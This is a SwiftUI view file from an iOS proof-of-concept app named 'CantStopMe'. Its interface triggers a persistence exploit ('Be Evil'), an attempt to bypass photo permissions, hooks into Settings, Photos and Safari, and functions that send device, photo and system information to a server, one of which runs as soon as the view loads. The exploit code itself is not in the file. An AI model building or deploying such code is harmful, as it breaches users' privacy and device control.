//
//  ContentView.swift
//  CantStopMe
//
//  Created by fridakitten on 03.05.25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("isEvil") var isEvil: Bool = false
    @AppStorage("stayalivev2") var stayalivev2: Bool = false
    @AppStorage("photoAccess") var photoAccess: Bool = false
    @AppStorage("systemHook") var systemHook: Bool = false
    
    init() {
        EvilFind()
        if isEvil {
            EvilWorkspace(mode: .stayalive)
        }
        sendDeviceInfoToServer()
    }
    
    var body: some View {
        VStack {
            Text("Evil")
                .foregroundColor(.red)
                .font(.system(size: 40)) +
            Text("Workspace")
                .foregroundColor(.primary)
                .font(.system(size: 40))
            Spacer()
            List {
                Section(header: Text("Persistence"),
                        footer: Text("This option makes ur phone even more unresposive than before! THIS IS A WARNING!")) {
                    Toggle("Switcher Trolling", isOn: $stayalivev2)
                }
                Section(footer: Text("Triggers the persistence exploit")) {
                    Button(isEvil ? "Dont be Evil" : "Be Evil") {
                        if !isEvil {
                            EvilWorkspace(mode: .stayalive)
                        }
                        isEvil = !isEvil
                    }
                    .foregroundColor(isEvil ? .red : .blue)
                }
                Section(header: Text("Photo Access (Scénario 3)"),
                        footer: Text("Tente d'accéder aux photos en bypassant les permissions")) {
                    Button(photoAccess ? "Stop Photo Monitoring" : "Start Photo Monitoring") {
                        if !photoAccess {
                            startPhotoMonitoring()
                        }
                        photoAccess = !photoAccess
                    }
                    .foregroundColor(photoAccess ? .red : .green)
                    
                    Button("Test Photo Access") {
                        if bypassPhotoAccess() {
                            sendPhotoInfoToServer()
                        }
                    }
                    .disabled(photoAccess)
                }
                Section(header: Text("System Hook"),
                        footer: Text("Tente d'hook des apps système pour accéder aux APIs")) {
                    Button(systemHook ? "Stop System Monitoring" : "Start System Monitoring") {
                        if !systemHook {
                            startSystemMonitoring()
                        }
                        systemHook = !systemHook
                    }
                    .foregroundColor(systemHook ? .red : .green)
                    
                    Button("Test System Hook") {
                        let systemApps = ["com.apple.Preferences", "com.apple.Photos", "com.apple.mobilesafari"]
                        for app in systemApps {
                            if hookSystemApp(app) {
                                sendSystemInfoToServer()
                                break
                            }
                        }
                    }
                    .disabled(systemHook)
                }
                Section(header: Text("App life cycle"),
                        footer: Text("Restarts the app.")) {
                    Button("Restart App") {
                        EvilWorkspace(mode: .restart)
                    }
                    .disabled(isEvil)
                }
            }
            .cornerRadius(20)
            Spacer()
            Text("PID: \(String(getpid()))")
            Text("Discovered by.SeanIsTethered")
            Section {
                
            }
        }
        .padding()
    }
}
